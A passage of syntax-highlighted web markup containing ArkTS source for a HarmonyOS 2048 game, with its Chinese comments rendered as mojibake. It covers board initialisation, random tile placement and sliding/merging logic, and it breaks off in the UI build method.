class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨è£…é¥°å™¨æ ‡è®°Cellç±»ï¼Œå¯èƒ½è¡¨ç¤ºè¯¥ç±»å…·æœ‰å¯è§‚æµ‹æ€§</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  <span class="comment">// ä½¿ç”¨Traceè£…é¥°å™¨æ ‡è®°valueå±æ€§ï¼Œå¯èƒ½è¡¨ç¤ºè¯¥å±æ€§çš„å˜åŒ–ä¼šè¢«è¿½è¸ª</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: number;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–å•å…ƒæ ¼çš„å€¼ä¸º0</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä½¿ç”¨Entryå’ŒComponentè£…é¥°å™¨æ ‡è®°Game2048ç»“æ„ä½“ï¼Œå¯èƒ½è¡¨ç¤ºè¿™æ˜¯ç¨‹åºçš„å…¥å£ç‚¹ï¼Œå¹¶ä¸”è¯¥ç»“æ„ä½“å®šä¹‰äº†ä¸€ä¸ªç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">  <span class="comment">// å®šä¹‰Game2048ç»“æ„ä½“</span></span><br><span class="line">struct <span class="title class_">Game2048</span> &#123;</span><br><span class="line">  <span class="comment">// ä½¿ç”¨Stateè£…é¥°å™¨æ ‡è®°çŠ¶æ€å˜é‡ï¼Œå¯èƒ½è¡¨ç¤ºè¿™äº›å˜é‡æ˜¯ç»„ä»¶çš„çŠ¶æ€</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">board</span>: <span class="title class_">Cell</span>[][] = []; <span class="comment">// æ¸¸æˆç›˜é¢</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">score</span>: number = <span class="number">0</span>; <span class="comment">// åˆ†æ•°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">200</span>; <span class="comment">// å•å…ƒæ ¼å¤§å°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellMargin</span>: number = <span class="number">5</span>; <span class="comment">// å•å…ƒæ ¼ä¹‹é—´çš„è¾¹è·</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartX</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Xåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">screenStartY</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸å¼€å§‹æ—¶çš„å±å¹•Yåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenX</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Xåæ ‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">lastScreenY</span>: number = <span class="number">0</span>; <span class="comment">// è§¦æ‘¸ç»“æŸæ—¶çš„å±å¹•Yåæ ‡</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å®šä¹‰é¢œè‰²æ•°ç»„</span></span><br><span class="line">  <span class="attr">colors</span>: string[] = [</span><br><span class="line">    <span class="string">&#x27;#CCCCCC&#x27;</span>, <span class="comment">// 0 - ç°è‰²</span></span><br><span class="line">    <span class="string">&#x27;#FFC107&#x27;</span>, <span class="comment">// 2 - é»„è‰²</span></span><br><span class="line">    <span class="string">&#x27;#FF9800&#x27;</span>, <span class="comment">// 4 - æ©™è‰²</span></span><br><span class="line">    <span class="string">&#x27;#FF5722&#x27;</span>, <span class="comment">// 8 - æ·±æ©™è‰²</span></span><br><span class="line">    <span class="string">&#x27;#F44336&#x27;</span>, <span class="comment">// 16 - çº¢è‰²</span></span><br><span class="line">    <span class="string">&#x27;#9C27B0&#x27;</span>, <span class="comment">// 32 - ç´«è‰²</span></span><br><span class="line">    <span class="string">&#x27;#3F51B5&#x27;</span>, <span class="comment">// 64 - è“ç´«è‰²</span></span><br><span class="line">    <span class="string">&#x27;#00BCD4&#x27;</span>, <span class="comment">// 128 - è“è‰²</span></span><br><span class="line">    <span class="string">&#x27;#009688&#x27;</span>, <span class="comment">// 256 - æ·±é’è‰²</span></span><br><span class="line">    <span class="string">&#x27;#4CAF50&#x27;</span>, <span class="comment">// 512 - ç»¿è‰²</span></span><br><span class="line">    <span class="string">&#x27;#8BC34A&#x27;</span>, <span class="comment">// 1024 - æµ…ç»¿è‰²</span></span><br><span class="line">    <span class="string">&#x27;#CDDC39&#x27;</span>, <span class="comment">// 2048 - æŸ æª¬é»„</span></span><br><span class="line">    <span class="string">&#x27;#FFEB3B&#x27;</span>, <span class="comment">// 4096 - æ·¡é»„è‰²</span></span><br><span class="line">    <span class="string">&#x27;#795548&#x27;</span>, <span class="comment">// 8192 - æ£•è‰²</span></span><br><span class="line">    <span class="string">&#x27;#607D8B&#x27;</span>, <span class="comment">// 16384 - æ·±ç°è‰²</span></span><br><span class="line">    <span class="string">&#x27;#9E9E9E&#x27;</span>, <span class="comment">// 32768 - ç°è‰²</span></span><br><span class="line">    <span class="string">&#x27;#000000&#x27;</span> <span class="comment">// ä»¥ä¸Š - é»‘è‰²</span></span><br><span class="line">  ];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ¸¸æˆå³å°†å‡ºç°æ—¶æ‰§è¡Œçš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">score</span> = <span class="number">0</span>; <span class="comment">// é‡ç½®åˆ†æ•°</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">initBoard</span>(); <span class="comment">// é‡æ–°åˆå§‹åŒ–æ¸¸æˆæ¿</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addRandomTiles</span>(<span class="number">2</span>); <span class="comment">// æ·»åŠ ä¸¤ä¸ªéšæœºæ–¹å—</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–æ¸¸æˆç›˜é¢</span></span><br><span class="line">  <span class="title function_">initBoard</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="attr">cellArr</span>: <span class="title class_">Cell</span>[] = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">          cellArr.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>()); <span class="comment">// åˆ›å»ºæ–°å•å…ƒæ ¼</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>.<span class="title function_">push</span>(cellArr); <span class="comment">// æ·»åŠ åˆ°ç›˜é¢</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">board</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">this</span>.<span class="property">board</span>[i].<span class="property">length</span>; j++) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">board</span>[i][j].<span class="property">value</span> = <span class="number">0</span>; <span class="comment">// æ¸…ç©ºå•å…ƒæ ¼</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åœ¨ç›˜é¢ä¸Šæ·»åŠ æŒ‡å®šæ•°é‡çš„éšæœºæ–¹å—</span></span><br><span class="line">  <span class="title function_">addRandomTiles</span>(<span class="params">count: number</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">emptyCells</span>: object[] = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> === <span class="number">0</span>) &#123;</span><br><span class="line">          emptyCells.<span class="title function_">push</span>(<span class="title class_">Object</span>(&#123; <span class="attr">row</span>: row, <span class="attr">col</span>: col &#125;)); <span class="comment">// è®°å½•ç©ºå•å…ƒæ ¼ä½ç½®</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (emptyCells.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> randomIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * emptyCells.<span class="property">length</span>);</span><br><span class="line">        <span class="keyword">let</span> obj = emptyCells[randomIndex];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[obj[<span class="string">&#x27;row&#x27;</span>]][obj[<span class="string">&#x27;col&#x27;</span>]].<span class="property">value</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.9</span> ? <span class="number">2</span> : <span class="number">4</span>; <span class="comment">// éšæœºç”Ÿæˆ2æˆ–4</span></span><br><span class="line">        emptyCells.<span class="title function_">splice</span>(randomIndex, <span class="number">1</span>); <span class="comment">// ç§»é™¤å·²ä½¿ç”¨çš„ç©ºå•å…ƒæ ¼ä½ç½®</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å‘å·¦æ»‘åŠ¨</span></span><br><span class="line">  <span class="title function_">slideLeft</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempRow</span>: number[] = []; <span class="comment">// ä¸´æ—¶å­˜å‚¨è¡Œæ•°æ®</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempRow.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// ç§»åŠ¨éé›¶å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">let</span> mergePos = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &lt; tempRow.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempRow[mergePos] === tempRow[mergePos + <span class="number">1</span>] &amp;&amp; !merged[mergePos]) &#123;</span><br><span class="line">          tempRow[mergePos] *= <span class="number">2</span>; <span class="comment">// åˆå¹¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempRow[mergePos]; <span class="comment">// æ›´æ–°åˆ†æ•°</span></span><br><span class="line">          merged[mergePos] = <span class="literal">true</span>; <span class="comment">// æ ‡è®°å·²åˆå¹¶</span></span><br><span class="line">          tempRow.<span class="title function_">splice</span>(mergePos + <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// ç§»é™¤åˆå¹¶è¿‡çš„å€¼</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">while</span> (tempRow.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempRow.<span class="title function_">push</span>(<span class="number">0</span>); <span class="comment">// å¡«å……ç©ºä½</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> = tempRow[col]; <span class="comment">// æ›´æ–°ç›˜é¢</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å‘å³æ»‘åŠ¨</span></span><br><span class="line">  <span class="title function_">slideRight</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempRow</span>: number[] = []; <span class="comment">// ä¸´æ—¶å­˜å‚¨è¡Œæ•°æ®</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">3</span>; col &gt;= <span class="number">0</span>; col--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempRow.<span class="title function_">unshift</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// ç§»åŠ¨éé›¶å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> mergePos = tempRow.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempRow[mergePos] === tempRow[mergePos - <span class="number">1</span>] &amp;&amp; !merged[mergePos - <span class="number">1</span>]) &#123;</span><br><span class="line">          tempRow[mergePos] *= <span class="number">2</span>; <span class="comment">// åˆå¹¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempRow[mergePos]; <span class="comment">// æ›´æ–°åˆ†æ•°</span></span><br><span class="line">          merged[mergePos - <span class="number">1</span>] = <span class="literal">true</span>; <span class="comment">// æ ‡è®°å·²åˆå¹¶</span></span><br><span class="line">          tempRow.<span class="title function_">splice</span>(mergePos - <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// ç§»é™¤åˆå¹¶è¿‡çš„å€¼</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">while</span> (tempRow.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempRow.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// å¡«å……ç©ºä½</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> = tempRow[col]; <span class="comment">// æ›´æ–°ç›˜é¢</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å‘ä¸Šæ»‘åŠ¨</span></span><br><span class="line">  <span class="title function_">slideUp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempCol</span>: number[] = []; <span class="comment">// ä¸´æ—¶å­˜å‚¨åˆ—æ•°æ®</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡</span></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempCol.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// ç§»åŠ¨éé›¶å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">let</span> mergePos = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &lt; tempCol.<span class="property">length</span> - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempCol[mergePos] === tempCol[mergePos + <span class="number">1</span>] &amp;&amp; !merged[mergePos]) &#123;</span><br><span class="line">          tempCol[mergePos] *= <span class="number">2</span>; <span class="comment">// åˆå¹¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempCol[mergePos]; <span class="comment">// æ›´æ–°åˆ†æ•°</span></span><br><span class="line">          merged[mergePos] = <span class="literal">true</span>; <span class="comment">// æ ‡è®°å·²åˆå¹¶</span></span><br><span class="line">          tempCol.<span class="title function_">splice</span>(mergePos + <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// ç§»é™¤åˆå¹¶è¿‡çš„å€¼</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">while</span> (tempCol.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempCol.<span class="title function_">push</span>(<span class="number">0</span>); <span class="comment">// å¡«å……ç©ºä½</span></span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> newRow = <span class="number">0</span>; newRow &lt; <span class="number">4</span>; newRow++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[newRow][col].<span class="property">value</span> = tempCol[newRow]; <span class="comment">// æ›´æ–°ç›˜é¢</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å‘ä¸‹æ»‘åŠ¨</span></span><br><span class="line">  <span class="title function_">slideDown</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> col = <span class="number">0</span>; col &lt; <span class="number">4</span>; col++) &#123;</span><br><span class="line">      <span class="keyword">let</span> <span class="attr">tempCol</span>: number[] = []; <span class="comment">// ä¸´æ—¶å­˜å‚¨åˆ—æ•°æ®</span></span><br><span class="line">      <span class="keyword">let</span> <span class="attr">merged</span>: boolean[] = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">4</span>).<span class="title function_">fill</span>(<span class="literal">false</span>); <span class="comment">// æ ‡è®°æ˜¯å¦å·²ç»åˆå¹¶è¿‡</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// ä»ä¸‹å¾€ä¸Šéå†åˆ—</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">3</span>; row &gt;= <span class="number">0</span>; row--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">          tempCol.<span class="title function_">unshift</span>(<span class="variable language_">this</span>.<span class="property">board</span>[row][col].<span class="property">value</span>); <span class="comment">// ç§»åŠ¨éé›¶å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> mergePos = tempCol.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">while</span> (mergePos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempCol[mergePos] === tempCol[mergePos - <span class="number">1</span>] &amp;&amp; !merged[mergePos - <span class="number">1</span>]) &#123;</span><br><span class="line">          tempCol[mergePos] *= <span class="number">2</span>; <span class="comment">// åˆå¹¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">score</span> += tempCol[mergePos]; <span class="comment">// æ›´æ–°åˆ†æ•°</span></span><br><span class="line">          merged[mergePos - <span class="number">1</span>] = <span class="literal">true</span>; <span class="comment">// æ ‡è®°å·²åˆå¹¶</span></span><br><span class="line">          tempCol.<span class="title function_">splice</span>(mergePos - <span class="number">1</span>, <span class="number">1</span>); <span class="comment">// ç§»é™¤åˆå¹¶è¿‡çš„å€¼</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          mergePos--;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// å¦‚æœæ•°ç»„é•¿åº¦å°äº4ï¼Œç”¨0å¡«å……</span></span><br><span class="line">      <span class="keyword">while</span> (tempCol.<span class="property">length</span> &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        tempCol.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// å¡«å……ç©ºä½</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// å°†å¤„ç†åçš„æ•°ç»„å…ƒç´ æ”¾å›åˆ°æ£‹ç›˜çš„å¯¹åº”åˆ—ä¸­</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> row = <span class="number">0</span>; row &lt; <span class="number">4</span>; row++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">board</span>[<span class="number">3</span> - row][col].<span class="property">value</span> = tempCol[<span class="number">3</span> - row]; <span class="comment">// æ³¨æ„åè½¬é¡ºåº</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºæ¸¸æˆç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// å¸ƒå±€å®¹å™¨</span></span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">10</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºå¾—åˆ†</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">`å¾—åˆ†: <span class="subst">$&#123;<span class="variable language_">this</span>.score&#125;</span>`</span>)</span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">24</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;)</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// åº•å±‚èƒŒæ™¯å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span>, <span class="attr">direction</span>: <span class="title class_">FlexDirection</span>.<span class="property">Row</span> 